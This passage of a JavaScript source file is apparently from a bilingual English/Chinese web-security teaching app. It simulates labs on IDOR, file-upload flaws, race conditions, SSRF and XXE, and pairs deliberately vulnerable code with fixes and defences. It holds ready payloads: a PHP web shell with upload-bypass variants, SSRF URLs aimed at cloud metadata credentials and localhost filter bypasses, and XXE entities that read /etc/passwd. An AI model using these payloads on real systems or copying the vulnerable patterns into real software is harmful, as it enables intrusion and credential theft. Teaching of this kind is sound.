    'Broken access control means the server doesn’t check whether this user may perform this action on this object. IDOR (insecure direct object reference) is the classic case: change an ID, get someone else’s data.',
    '访问控制失效是指服务器没有检查“这个用户能否对这个对象执行这个操作”。IDOR（不安全的直接对象引用）是典型案例：改一个 ID，就能拿到别人的数据。',
  ),
  labTitle: L('You are alice. Read other invoices.', '你是 alice，去读别人的账单'),
  lab: {
    fields: [
      { id: 'id', label: L('Invoice ID in the URL', 'URL 中的账单 ID'), default: '1001' },
      { id: 'path', label: L('Or try a path', '或者试试某个路径'), default: '/invoices' },
    ],
    presets: [
      { label: L('My invoice', '我的账单'), values: { id: '1002', path: '/invoices' } },
      { label: L('Carlos’s invoice', 'Carlos 的账单'), values: { id: '1001', path: '/invoices' } },
      { label: L('Admin panel', '管理后台'), values: { id: '', path: '/admin/delete-user?u=carlos' } },
    ],
    defense: { label: L('Authorisation check', '授权检查'), off: L('Missing', '缺失'), on: L('Enforced server-side', '服务器端强制') },
    run({ values, defended }) {
      if (values.path.startsWith('/admin')) {
        const request = `GET ${values.path} HTTP/1.1\nCookie: session=alice…`;
        if (defended) return { request, log: ['user=alice role=student', L('🛡 requires role=admin → 403', '🛡 需要 role=admin → 403')], response: 'HTTP/1.1 403 Forbidden', ...verdict(false, 'Function-level access control: the endpoint checks the role, not just whether a link is visible.', '功能级访问控制：接口检查的是角色，而不只是页面上是否显示了链接。') };
        return { request, log: ['user=alice role=student', L('⚠ no role check; the link was merely hidden in the UI', '⚠ 没有检查角色；只是在界面上隐藏了链接')], response: 'HTTP/1.1 200 OK\n\nUser carlos deleted.', ...verdict(true, 'Vertical privilege escalation: a normal user performed an admin action.', '纵向越权：普通用户执行了管理员操作。') };
      }
      const id = parseInt(values.id, 10);
      const inv = INVOICES[id];
      const request = `GET /invoices/${values.id} HTTP/1.1\nCookie: session=alice…`;
      if (!inv) return { request, log: [], response: 'HTTP/1.1 404 Not Found', verdict: 'neutral', message: L('Try 1001–1003.', '试试 1001–1003。') };
      const log = [`SELECT * FROM invoices WHERE id=${id}`, `owner=${inv.owner}, current user=alice`];
      if (inv.owner !== 'alice' && defended) return { request, log: [...log, L('🛡 owner ≠ current user → 404', '🛡 所有者 ≠ 当前用户 → 404')], response: 'HTTP/1.1 404 Not Found', ...verdict(false, 'The query is scoped to the logged-in user, so other IDs simply do not exist for alice.', '查询限定在当前登录用户范围内，所以对 alice 来说其他 ID 根本不存在。') };
      return { request, log: inv.owner !== 'alice' ? [...log, L('⚠ ownership never checked', '⚠ 从未检查归属')] : log, response: `HTTP/1.1 200 OK\n\n${inv.text}`, ...verdict(inv.owner !== 'alice', inv.owner !== 'alice' ? `Horizontal privilege escalation: alice read ${inv.owner}’s invoice.` : 'Alice’s own invoice.', inv.owner !== 'alice' ? `横向越权：alice 读到了 ${inv.owner} 的账单。` : 'Alice 自己的账单。') };
    },
  },
  actors: [actor('alice', L('Alice (attacker)', 'Alice（攻击者）'), 'student', 'red'), APP(), actor('db', L('Database', '数据库'), 'invoices', 'amber')],
  flow: [
    msg('alice', 'app', 'GET /invoices/1002', L('Alice views her own invoice and notices the sequential ID.', 'Alice 查看自己的账单，注意到 ID 是连续的。')),
    msg('alice', 'app', 'GET /invoices/1001', L('She decrements it. Authentication is fine: she really is logged in.', '她把 ID 减一。认证没问题：她确实已登录。'), 'attack'),
    msg('app', 'db', 'SELECT … WHERE id = 1001', L('The query uses only the ID from the URL, not who is asking.', '查询只用了 URL 里的 ID，没管是谁在请求。'), 'attack'),
    msg('db', 'app', "carlos's invoice", L('The database returns whatever matches.', '数据库返回匹配的记录。')),
    msg('app', 'alice', '200 OK · Carlos · $2,180', L('Authentication answers “who are you?”. Authorisation answers “may you do this?”. Only the first one happened.', '认证回答“你是谁”，授权回答“你能不能做这件事”。这里只做了前者。'), 'attack'),
  ],
  concepts: [
    { t: L('Horizontal', '横向越权'), b: L('Same privilege level, someone else’s data: IDOR on IDs, usernames or filenames.', '同级权限，访问他人数据：基于 ID、用户名或文件名的 IDOR。') },
    { t: L('Vertical', '纵向越权'), b: L('Reaching functions for a higher role: /admin endpoints, role=admin cookies, hidden buttons.', '访问更高角色的功能：/admin 接口、role=admin 的 Cookie、隐藏按钮。') },
    { t: L('Context-dependent', '依赖上下文'), b: L('Actions allowed only in a certain state, e.g. editing an order after it shipped.', '只在特定状态下允许的操作，比如订单发货后还能修改。') },
  ],
  code: {
    vuln: `@app.get("/invoices/<int:id>")
@login_required
def invoice(id):
    return Invoice.query.get_or_404(id)`,
    fixed: `@app.get("/invoices/<int:id>")
@login_required
def invoice(id):
    return Invoice.query.filter_by(
        id=id, owner_id=current_user.id).first_or_404()`,
  },
  defenses: [
    { title: L('Deny by default', '默认拒绝'), body: L('Every endpoint requires an explicit authorisation rule; centralise it in middleware or policies.', '每个接口都需要显式的授权规则，并集中在中间件或策略层实现。') },
    { title: L('Scope queries to the user', '查询限定在当前用户'), body: L('Fetch objects through the current user (user.invoices.get(id)) so ownership is built in.', '通过当前用户获取对象（user.invoices.get(id)），把归属检查内置进去。') },
    { title: L('Unguessable IDs are not a fix', '不可猜的 ID 不是修复'), body: L('UUIDs slow enumeration but leak in URLs and logs. Always check ownership.', 'UUID 能减缓枚举，但会在 URL 和日志里泄露。始终要检查归属。') },
  ],
  qa: [
    { q: L('What is the difference between authentication and authorisation?', '认证和授权有什么区别？'), a: L('Authentication proves identity; authorisation decides what that identity may do. IDOR is an authorisation failure on a properly authenticated request.', '认证证明身份；授权决定这个身份能做什么。IDOR 是在认证正确的请求上发生的授权失败。') },
    { q: L('How would you test an app for IDOR at scale?', '如何大规模测试 IDOR？'), a: L('Use two accounts, replay every request of user A with user B’s session (e.g. Burp Autorize), and compare responses.', '准备两个账号，用 B 的会话重放 A 的每个请求（比如用 Burp 的 Autorize 插件），对比响应。') },
  ],
};

/* ------------------------------------------------------------- file upload */
const fileUpload = {
  tldr: L(
    'File upload vulnerabilities let users upload files the server later treats as code, or that overwrite something important. A PHP “avatar” that the server executes is instant remote code execution.',
    '文件上传漏洞让用户上传的文件被服务器当作代码执行，或者覆盖重要文件。一个被服务器执行的 PHP“头像”就等于直接远程代码执行。',
  ),
  labTitle: L('Upload an avatar', '上传头像'),
  lab: {
    fields: [
      { id: 'name', label: L('Filename', '文件名'), default: 'shell.php' },
      { id: 'type', label: 'Content-Type', default: 'image/png' },
      { id: 'body', label: L('File content', '文件内容'), default: "<?php system($_GET['cmd']); ?>", rows: 2 },
    ],
    presets: [
      { label: L('Real image', '真实图片'), values: { name: 'me.png', type: 'image/png', body: '\\x89PNG\\r\\n…' } },
      { label: L('PHP shell', 'PHP Shell'), values: { name: 'shell.php', type: 'application/x-php', body: "<?php system($_GET['cmd']); ?>" } },
      { label: L('Spoofed Content-Type', '伪造 Content-Type'), values: { name: 'shell.php', type: 'image/png', body: "<?php system($_GET['cmd']); ?>" } },
      { label: L('Double extension', '双扩展名'), values: { name: 'shell.php.png', type: 'image/png', body: "<?php system($_GET['cmd']); ?>" } },
      { label: L('Polyglot .phtml', '多语言文件 .phtml'), values: { name: 'cat.phtml', type: 'image/png', body: "GIF89a<?php system($_GET['cmd']); ?>" } },
    ],
    defense: { label: L('Upload handling', '上传处理'), off: L('Check Content-Type only', '只检查 Content-Type'), on: L('Allow-list + rename + no-exec storage', '白名单 + 重命名 + 不可执行存储') },
    run({ values, defended }) {
      const { name, type, body } = values;
      const request = `POST /avatar HTTP/1.1\nContent-Type: multipart/form-data\n\nfilename="${name}"\nContent-Type: ${type}\n\n${body}`;
      const ext = name.split('.').pop().toLowerCase();
      const isCode = /<\?php|<%|<script/i.test(body);
      if (defended) {
        const okExt = ['png', 'jpg', 'jpeg', 'gif'].includes(ext);
        const looksImage = /^(\\x89PNG|GIF8|\\xFF\\xD8)/.test(body);
        if (!okExt || !looksImage || isCode) return { request, log: [okExt ? L(`extension .${ext} allowed`, `扩展名 .${ext} 允许`) : L(`🛡 .${ext} not in [png, jpg, gif]`, `🛡 .${ext} 不在 [png, jpg, gif] 内`), looksImage ? L('magic bytes ok', '文件头正确') : L('🛡 magic bytes are not an image', '🛡 文件头不是图片'), L('🛡 re-encoding the image would also strip embedded code', '🛡 重新编码图片也会去掉嵌入的代码')], response: 'HTTP/1.1 400 Bad Request', ...verdict(false, 'Rejected. Even if something slipped through, it would be renamed to a random .png and served from a domain that never executes scripts.', '被拒绝。即使有东西漏过去，也会被重命名为随机的 .png，并从一个从不执行脚本的域名提供。') };
        return { request, log: [L('✓ allowed extension and real image', '✓ 扩展名合法且确实是图片'), L('✓ stored as /u/7f3a9c.png on static.cdn (no PHP)', '✓ 以 /u/7f3a9c.png 存在 static.cdn（不运行 PHP）')], response: 'HTTP/1.1 200 OK', ...verdict(false, 'A real image, stored safely.', '一张真实的图片，被安全存储。') };
      }
      const log = [`Content-Type: ${type}`];
      if (!type.startsWith('image/')) return { request, log: [...log, L('rejected: not image/*', '拒绝：不是 image/*')], response: 'HTTP/1.1 400 Bad Request', verdict: 'neutral', message: L('Blocked by the Content-Type check. But that header is chosen by the client…', '被 Content-Type 检查拦下了。但这个头是客户端自己填的……') };
      log.push(L(`✓ "image" accepted → saved as /var/www/uploads/${name}`, `✓ 判定为“图片” → 保存为 /var/www/uploads/${name}`));
      const executes = isCode && ['php', 'phtml', 'php5', 'phar'].includes(ext);
      if (executes) log.push(L(`⚠ Apache maps .${ext} to the PHP handler`, `⚠ Apache 把 .${ext} 交给 PHP 处理器`), L('⚠ GET /uploads/' + name + '?cmd=id', '⚠ GET /uploads/' + name + '?cmd=id'));
      return { request, log, response: executes ? 'uid=33(www-data) gid=33(www-data)' : `HTTP/1.1 200 OK\n\n(file served as ${ext === 'png' ? 'image/png' : 'text/plain'})`, ...(executes ? verdict(true, 'Remote code execution: the uploaded file runs as PHP.', '远程代码执行：上传的文件被当作 PHP 运行了。') : { verdict: 'neutral', message: L(isCode ? 'Uploaded, but .png is not executed. Try an extension the server runs.' : 'A normal upload.', isCode ? '上传成功，但 .png 不会被执行。试试服务器会执行的扩展名。' : '正常上传。') }) };
    },
  },
  actors: [ATTACKER, APP('Apache + PHP'), actor('disk', L('Uploads dir', '上传目录'), '/var/www/uploads', 'amber')],
  flow: [
    msg('atk', 'app', 'POST /avatar  shell.php (image/png)', L('The attacker uploads PHP code, labelled as an image.', '攻击者上传 PHP 代码，并把它标记为图片。'), 'attack'),
    msg('app', 'app', 'Content-Type starts with image/ ✓', L('The only check is a header the client controls.', '唯一的检查是一个由客户端控制的请求头。'), 'attack'),
    msg('app', 'disk', 'save uploads/shell.php', L('The file keeps its name, inside the web root.', '文件保留原名，并存放在 Web 根目录下。'), 'attack'),
    msg('atk', 'app', 'GET /uploads/shell.php?cmd=id', L('Requesting it makes the server run it as PHP.', '请求它就会让服务器把它当 PHP 执行。'), 'attack'),
    msg('app', 'atk', 'uid=33(www-data)', L('Full command execution as the web server user.', '以 Web 服务用户身份完全执行命令。'), 'attack'),
  ],
  code: {
    vuln: `if ($_FILES['f']['type'] === 'image/png') {
  move_uploaded_file($_FILES['f']['tmp_name'],
      'uploads/' . $_FILES['f']['name']);
}`,
    fixed: `$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
if (!in_array($ext, ['png','jpg','gif'], true)) die(400);
$img = imagecreatefromstring(file_get_contents($tmp)); // re-encode
if (!$img) die(400);
imagepng($img, '/srv/blobs/' . bin2hex(random_bytes(16)) . '.png');
// served from static.cdn, PHP disabled there`,
  },
  defenses: [
    { title: L('Allow-list extensions, rename files', '扩展名白名单，重命名文件'), body: L('Pick the stored name yourself (random ID + fixed extension). Never trust filename or Content-Type.', '自己决定存储的文件名（随机 ID + 固定扩展名）。永远不要信任文件名或 Content-Type。') },
    { title: L('Store outside the web root', '存放在 Web 根目录之外'), body: L('Serve uploads from a separate domain or object store with no script execution and Content-Disposition: attachment where possible.', '从独立域名或对象存储提供上传文件，禁止脚本执行，并尽可能加上 Content-Disposition: attachment。') },
    { title: L('Validate content', '校验内容'), body: L('Re-encode images, scan files, and limit size to prevent DoS.', '重新编码图片、扫描文件、限制大小以防拒绝服务。') },
  ],
  qa: [
    { q: L('Why isn’t checking magic bytes enough?', '为什么只检查文件头不够？'), a: L('Polyglot files are valid images and valid PHP at the same time (GIF89a<?php …). Extension and execution context matter more.', '多语言文件可以同时是合法图片和合法 PHP（GIF89a<?php …）。扩展名和执行环境更关键。') },
    { q: L('Can an uploaded SVG be dangerous?', '上传的 SVG 会有危险吗？'), a: L('Yes. SVG is XML that can contain <script>; served from your origin it is stored XSS.', '会。SVG 是可以包含 <script> 的 XML，如果从你的源提供，就是存储型 XSS。') },
  ],
};

/* ------------------------------------------------------------ race conditions */
const race = {
  tldr: L(
    'A race condition appears when the app checks something and then acts on it in two separate steps. Requests that arrive in the gap between “check” and “update” all see the old state.',
    '当应用分两步“先检查、再执行”时就可能出现竞态条件。在“检查”和“更新”之间到达的请求，看到的都是旧状态。',
  ),
  labTitle: L('Redeem a single-use coupon many times', '多次使用一张单次优惠券'),
  lab: {
    fields: [{ id: 'n', label: L('Parallel requests (single-packet attack)', '并发请求数（单包攻击）'), default: '8' }],
    presets: [
      { label: L('One request', '一个请求'), values: { n: '1' } },
      { label: L('8 in parallel', '并发 8 个'), values: { n: '8' } },
      { label: L('30 in parallel', '并发 30 个'), values: { n: '30' } },
    ],
    defense: { label: L('Coupon redemption', '优惠券核销'), off: L('Check, then update', '先检查后更新'), on: L('Atomic update', '原子更新') },
    run({ values, defended }) {
      const n = Math.min(50, Math.max(1, parseInt(values.n, 10) || 1));
      const log = [];
      let wins = 0;
      if (defended) {
        for (let i = 1; i <= n; i++) {
          const ok = i === 1;
          if (ok) wins++;
          log.push(ok ? L(`req ${i}: UPDATE … SET used=1 WHERE code='SAVE20' AND used=0 → 1 row ✓`, `请求 ${i}：UPDATE … SET used=1 WHERE code='SAVE20' AND used=0 → 1 行 ✓`) : L(`🛡 req ${i}: same UPDATE → 0 rows, rejected`, `🛡 请求 ${i}：同样的 UPDATE → 0 行，被拒绝`));
        }
      } else {
        // All requests arrive within ~1ms; the check takes 5ms (DB round trip), so they all read used=0.
        for (let i = 1; i <= n; i++) log.push(`t=0.${i}ms  req ${i}: SELECT used → 0`);
        for (let i = 1; i <= n; i++) {
          wins++;
          log.push(L(`⚠ t=5.${i}ms  req ${i}: apply 20% off, SET used=1`, `⚠ t=5.${i}ms  请求 ${i}：打八折，SET used=1`));
        }
      }
      const price = 100 * Math.pow(0.8, wins);
      return {
        request: `${n} × POST /cart/coupon\n\ncode=SAVE20`,
        log: log.slice(0, 24).concat(log.length > 24 ? ['…'] : []),
        response: `Cart total: $${price.toFixed(2)} (coupon applied ${wins}×)`,
        ...verdict(wins > 1, wins > 1 ? `The coupon was applied ${wins} times. $100 became $${price.toFixed(2)}.` : 'The coupon was applied once, as intended.', wins > 1 ? `优惠券被使用了 ${wins} 次，$100 变成了 $${price.toFixed(2)}。` : '优惠券按预期只用了一次。'),
      };
    },
  },
  actors: [actor('atk', L('Attacker (×N)', '攻击者（×N）'), 'parallel', 'red'), APP(), actor('db', L('Database', '数据库'), 'coupons', 'amber')],
  flow: [
    msg('atk', 'app', '20 × POST /coupon (one TCP packet)', L('HTTP/2 lets all requests be completed in a single packet, so they arrive at the same instant.', 'HTTP/2 可以让所有请求在同一个数据包里完成，因此它们同时到达。'), 'attack'),
    msg('app', 'db', '20 × SELECT used FROM coupons', L('Every request runs the check before any has written.', '在任何一个请求写入之前，每个请求都已执行了检查。'), 'attack'),
    msg('db', 'app', 'used = 0 (×20)', L('All of them see the coupon as unused. This gap is the race window.', '它们都看到优惠券“未使用”。这个间隙就是竞态窗口。')),
    msg('app', 'db', '20 × UPDATE used = 1, apply discount', L('Each request applies the discount, then marks it used, too late.', '每个请求都打了折，然后才标记为已使用，但已经太晚了。'), 'attack'),
    msg('app', 'atk', 'discount applied ×20', L('Same pattern breaks rate limits, gift card balances, MFA attempts and “one vote per user”.', '同样的模式也能击穿限速、礼品卡余额、MFA 次数限制和“每人一票”。'), 'attack'),
  ],
  code: {
    vuln: `coupon = db.query("SELECT used FROM coupons WHERE code=?", code)
if not coupon.used:
    cart.apply_discount(20)
    db.execute("UPDATE coupons SET used=1 WHERE code=?", code)`,
    fixed: `rows = db.execute(
  "UPDATE coupons SET used=1 WHERE code=? AND used=0", code
).rowcount
if rows == 1:          # only one request can win
    cart.apply_discount(20)`,
  },
  defenses: [
    { title: L('Make check-and-act atomic', '让“检查并执行”成为原子操作'), body: L('Conditional UPDATE, SELECT … FOR UPDATE, or a unique constraint, so the database decides the winner.', '使用条件 UPDATE、SELECT … FOR UPDATE 或唯一约束，让数据库决定谁获胜。') },
    { title: L('Idempotency keys', '幂等键'), body: L('For payments and orders, accept each client-generated key only once.', '对于支付和订单，每个客户端生成的键只接受一次。') },
    { title: L('Avoid mixing data stores', '避免跨存储混用'), body: L('State split across a cache and a DB, or session and DB, creates hidden race windows.', '状态分散在缓存与数据库、或会话与数据库之间，会产生隐藏的竞态窗口。') },
  ],
  qa: [
    { q: L('What is a TOCTOU bug?', '什么是 TOCTOU 漏洞？'), a: L('Time-of-check to time-of-use: the condition is valid when checked but has changed by the time it is used.', 'Time-of-check to time-of-use（检查时与使用时不一致）：检查时条件成立，使用时已经变了。') },
    { q: L('Why did HTTP/2 make these attacks easier?', '为什么 HTTP/2 让这类攻击更容易？'), a: L('Network jitter used to spread requests out. Sending the last byte of many requests in one packet removes jitter, so dozens of requests land within a millisecond.', '过去网络抖动会把请求分散开。把许多请求的最后一个字节放在同一个包里发送，消除了抖动，几十个请求能在一毫秒内同时到达。') },
  ],
};

/* ------------------------------------------------------------------- SSRF */
function parseHost(url) {
  const m = /^[a-z]+:\/\/([^/:?#]+)/i.exec(url.trim());
  return m ? m[1].toLowerCase() : null;
}
function toIPv4(host) {
  if (/^\d+$/.test(host)) {
    const n = Number(host);
    return [n >>> 24, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.');
  }
  if (/^0x[0-9a-f]+$/i.test(host)) return toIPv4(String(parseInt(host, 16)));
  if (host === 'localhost' || host.endsWith('.localtest.me')) return '127.0.0.1';
  if (host.endsWith('.nip.io')) return host.replace('.nip.io', '').split('.').slice(-4).join('.');
  const parts = host.split('.');
  if (parts.every((p) => /^\d+$/.test(p)) && parts.length < 4) {
    // 127.1 → 127.0.0.1
    const last = parts.pop();
    while (parts.length < 3) parts.push('0');
    return [...parts, last].join('.');
  }
  if (parts.length === 4 && parts.every((p) => /^\d+$/.test(p))) return host;
  return '93.184.215.14';
}
const isInternal = (ip) => /^(127\.|10\.|192\.168\.|169\.254\.|172\.(1[6-9]|2\d|3[01])\.|0\.)/.test(ip);
const ssrf = {
  tldr: L(
    'SSRF makes the server send HTTP requests on the attacker’s behalf. Because the server sits inside the network, it can reach admin panels, internal APIs and cloud metadata endpoints that hold credentials.',
    'SSRF 让服务器代替攻击者发出 HTTP 请求。由于服务器位于内网，它能访问管理后台、内部 API，以及存放凭据的云元数据接口。',
  ),
  labTitle: L('Abuse a “check stock” URL', '滥用“查询库存”的 URL'),
  lab: {
    fields: [{ id: 'u', label: 'stockApi', default: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role' }],
    presets: [
      { label: L('Normal', '正常'), values: { u: 'http://stock.shop.example/check?id=3' } },
      { label: L('Cloud metadata', '云元数据'), values: { u: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role' } },
      { label: 'localhost/admin', values: { u: 'http://localhost/admin' } },
      { label: '127.1', values: { u: 'http://127.1/admin' } },
      { label: L('Decimal IP', '十进制 IP'), values: { u: 'http://2130706433/admin' } },
      { label: L('DNS → 127.0.0.1', 'DNS 解析到 127.0.0.1'), values: { u: 'http://admin.localtest.me/admin' } },
    ],
    defense: { label: L('URL validation', 'URL 校验'), off: L('Naive blocklist', '简陋黑名单'), on: L('Allow-list + resolved-IP check', '白名单 + 解析后 IP 检查') },
    run({ values, defended }) {
      const host = parseHost(values.u);
      const request = `POST /product/stock HTTP/1.1\n\nstockApi=${values.u}`;
      if (!host) return { request, log: [], response: 'HTTP/1.1 400 Bad Request', verdict: 'neutral', message: L('Not a URL.', '不是有效的 URL。') };
      const ip = toIPv4(host);
      const log = [`host = ${host}`, L(`resolves to ${ip}`, `解析为 ${ip}`)];
      if (defended) {
        const allowed = host === 'stock.shop.example';
        if (!allowed || isInternal(ip)) return { request, log: [...log, L(`🛡 ${host} is not stock.shop.example → blocked`, `🛡 ${host} 不是 stock.shop.example → 拦截`)], response: 'HTTP/1.1 400 Bad Request', ...verdict(false, 'Only the one stock service is allowed, and the resolved IP is checked too (against DNS tricks).', '只允许访问那一个库存服务，并且会检查解析后的 IP（防 DNS 技巧）。') };
        return { request, log: [...log, L('✓ allowed', '✓ 允许')], response: '{"inStock": 42}', ...verdict(false, 'Normal stock check.', '正常的库存查询。') };
      }
      if (/(^|\.)(localhost|127\.0\.0\.1)$/.test(host) || host === '169.254.169.254')
        return { request, log: [...log, L('blocklist matched the literal string → blocked', '黑名单命中字面字符串 → 拦截')], response: 'HTTP/1.1 400 "External stock check only"', verdict: 'neutral', message: L('The blocklist caught the obvious spelling. Try another way to write the same address.', '黑名单拦住了显而易见的写法。试试同一地址的其他写法。') };
      log.push(L(`server fetches ${values.u}`, `服务器请求 ${values.u}`));
      if (ip.startsWith('169.254.')) return { request, log: [...log, L('⚠ reached cloud metadata service', '⚠ 访问到了云元数据服务')], response: '{"AccessKeyId":"ASIA…","SecretAccessKey":"wJalr…","Token":"IQoJ…"}', ...verdict(true, 'Temporary cloud credentials for the server’s IAM role. Game over for the cloud account.', '拿到了服务器 IAM 角色的临时云凭据，整个云账号沦陷。') };
      if (isInternal(ip)) return { request, log: [...log, L(`⚠ ${host} is ${ip}: an internal address`, `⚠ ${host} 就是 ${ip}：内网地址`)], response: '<h1>Admin panel</h1> (no auth required from localhost)\n<a href="/admin/delete?username=carlos">Delete carlos</a>', ...verdict(true, 'The admin panel trusts requests from localhost. The blocklist only matched exact strings.', '管理后台信任来自 localhost 的请求，而黑名单只匹配了精确字符串。') };
      return { request, log, response: '{"inStock": 42}', verdict: 'neutral', message: L('A normal external request.', '一个正常的外部请求。') };
    },
  },
  actors: [ATTACKER, APP(), actor('int', L('Internal network', '内部网络'), '169.254.169.254', 'amber')],
  flow: [
    msg('atk', 'app', 'stockApi=http://169.254.169.254/…', L('A feature takes a URL from the client: stock checks, webhooks, PDF renderers, image fetchers.', '某个功能从客户端接收 URL：库存查询、Webhook、PDF 渲染、图片抓取等。'), 'attack'),
    msg('app', 'app', 'fetch(stockApi)', L('The server makes the request from inside the network, with its own identity.', '服务器以自己的身份，从内网发起请求。'), 'attack'),
    msg('app', 'int', 'GET /latest/meta-data/iam/…', L('The metadata service is only reachable from the instance, and trusts it completely.', '元数据服务只有实例本身能访问，并且完全信任它。'), 'attack'),
    msg('int', 'app', 'AccessKeyId, SecretAccessKey', L('Returns credentials for the instance role.', '返回实例角色的凭据。')),
    msg('app', 'atk', 'response body forwarded', L('Full-read SSRF: the response is shown. Blind SSRF still allows port scanning and hitting internal endpoints.', '完整回显型 SSRF：响应会被展示。即便是盲 SSRF，也能用来扫描端口、访问内部接口。'), 'attack'),
  ],
  code: {
    vuln: `@app.post("/product/stock")
def stock():
    return requests.get(request.form["stockApi"]).text`,
    fixed: `ALLOWED = {"stock.shop.example"}
def stock():
    product_id = int(request.form["productId"])  # don't take a URL at all
    url = f"https://stock.shop.example/check?id={product_id}"
    return session_no_redirects.get(url, timeout=3).text`,
  },
  defenses: [
    { title: L('Don’t accept URLs', '不要接受 URL'), body: L('Take an ID and build the URL server-side. If you must, allow-list exact hosts.', '只接受一个 ID，在服务器端拼出 URL。如果必须接受 URL，就精确白名单主机名。') },
    { title: L('Check the resolved IP, disable redirects', '检查解析后 IP，禁止重定向'), body: L('Block private, loopback and link-local ranges after DNS resolution, and pin that IP for the connection (DNS rebinding).', '在 DNS 解析后拦截私有、回环和链路本地地址，并在连接时固定该 IP（防 DNS 重绑定）。') },
    { title: L('Network-level controls', '网络层控制'), body: L('Egress firewalls, IMDSv2 (requires a PUT + token), and internal services that require auth even from inside.', '出站防火墙、IMDSv2（需要先 PUT 获取令牌），以及即便来自内网也要求认证的内部服务。') },
  ],
  qa: [
    { q: L('Why is 169.254.169.254 such a famous target?', '为什么 169.254.169.254 这么有名？'), a: L('It is the cloud instance metadata endpoint on AWS, GCP and Azure. It can return IAM credentials. The 2019 Capital One breach started with SSRF to it.', '它是 AWS、GCP、Azure 上的实例元数据接口，可以返回 IAM 凭据。2019 年 Capital One 数据泄露就是从对它的 SSRF 开始的。') },
    { q: L('How does DNS rebinding bypass SSRF filters?', 'DNS 重绑定如何绕过 SSRF 过滤？'), a: L('The domain resolves to a public IP when validated, then to 127.0.0.1 when the actual request is made. Resolve once and connect to that exact IP.', '域名在校验时解析为公网 IP，实际请求时又解析为 127.0.0.1。正确做法是只解析一次，并连接到那个确切的 IP。') },
  ],
};

/* -------------------------------------------------------------------- XXE */
const xxe = {
  tldr: L(
    'XXE abuses XML parsers that process DTDs. An attacker defines an external entity pointing at a file or URL, and the parser fetches it and inserts the content into the document.',
    'XXE 利用会处理 DTD 的 XML 解析器。攻击者定义一个指向文件或 URL 的外部实体，解析器就会去读取它，并把内容插入文档。',
  ),
  labTitle: L('Read a file through a stock-check XML', '通过库存查询 XML 读取文件'),
  lab: {
    fields: [
      {
        id: 'x',
        label: L('XML body', 'XML 请求体'),
        rows: 6,
        default: '<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<stockCheck><productId>&xxe;</productId></stockCheck>',
      },
    ],
    presets: [
      { label: L('Normal', '正常'), values: { x: '<?xml version="1.0"?>\n<stockCheck><productId>3</productId></stockCheck>' } },
      { label: 'file:///etc/passwd', values: { x: '<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<stockCheck><productId>&xxe;</productId></stockCheck>' } },
      { label: L('SSRF via XXE', '借 XXE 实现 SSRF'), values: { x: '<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>\n<stockCheck><productId>&xxe;</productId></stockCheck>' } },
    ],
    defense: { label: L('XML parser', 'XML 解析器'), off: L('DTDs enabled', '允许 DTD'), on: L('DTDs / external entities disabled', '禁用 DTD / 外部实体') },
    run({ values, defended }) {
      const x = values.x;
      const request = `POST /product/stock HTTP/1.1\nContent-Type: application/xml\n\n${x}`;
      const ents = Object.fromEntries([...x.matchAll(/<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)"\s*>/g)].map((m) => [m[1], m[2]]));
      const pid = (/<productId>([\s\S]*?)<\/productId>/.exec(x) || [])[1];
      if (pid == null) return { request, log: [], response: 'HTTP/1.1 400 "XML parsing error"', verdict: 'neutral', message: L('No <productId> element.', '缺少 <productId> 元素。') };
      if (defended && /<!DOCTYPE/i.test(x)) return { request, log: [L('🛡 DOCTYPE is disallowed (disallow-doctype-decl=true)', '🛡 不允许 DOCTYPE（disallow-doctype-decl=true）')], response: 'HTTP/1.1 400 "DOCTYPE not allowed"', ...verdict(false, 'With DTD processing off, entities never resolve.', '关闭 DTD 处理后，实体永远不会被解析。') };
      const log = [];
      let value = pid;
      for (const [name, uri] of Object.entries(ents)) {
        log.push(L(`⚠ parser resolves &${name}; → fetch ${uri}`, `⚠ 解析器解析 &${name}; → 读取 ${uri}`));
        const content = uri.startsWith('file:///etc/passwd') ? 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:…' : uri.includes('169.254') ? 'ami-id\niam/\ninstance-id' : '(content of ' + uri + ')';
        value = value.replaceAll(`&${name};`, content);
      }
      const leaked = Object.keys(ents).length > 0 && value !== pid;
      return { request, log, response: /^\d+$/.test(value) ? '42 units' : `HTTP/1.1 400\n\nInvalid product ID: ${value}`, ...(leaked ? verdict(true, 'The file content came back inside the error message.', '文件内容随错误信息一起返回了。') : { verdict: 'neutral', message: L('Normal request.', '正常请求。') }) };
    },
  },
  actors: [ATTACKER, APP('Java XML API'), actor('fs', L('File system / network', '文件系统 / 网络'), 'file://, http://', 'amber')],
  flow: [
    msg('atk', 'app', 'POST XML with <!DOCTYPE … SYSTEM "file:///etc/passwd">', L('The attacker adds a DTD that defines an external entity.', '攻击者加入一个定义了外部实体的 DTD。'), 'attack'),
    msg('app', 'app', 'parse(xml)', L('Many parsers process DTDs by default.', '很多解析器默认会处理 DTD。'), 'attack'),
    msg('app', 'fs', 'read /etc/passwd', L('Resolving &xxe; makes the parser read the file.', '解析 &xxe; 时，解析器读取了该文件。'), 'attack'),
    msg('fs', 'app', 'root:x:0:0…', L('The content is placed where &xxe; was.', '内容被放到了 &xxe; 所在的位置。')),
    msg('app', 'atk', '“Invalid product ID: root:x:0:0…”', L('Reflected in an error. Blind XXE exfiltrates via out-of-band requests or error messages from a malicious external DTD.', '通过错误信息反射回来。盲 XXE 则借助带外请求，或恶意外部 DTD 产生的错误信息外传数据。'), 'attack'),
  ],
  code: {
    vuln: `DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
Document doc = f.newDocumentBuilder().parse(request.getInputStream());`,
    fixed: `DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
f.setXIncludeAware(false);
f.setExpandEntityReferences(false);
Document doc = f.newDocumentBuilder().parse(request.getInputStream());`,
  },
  defenses: [
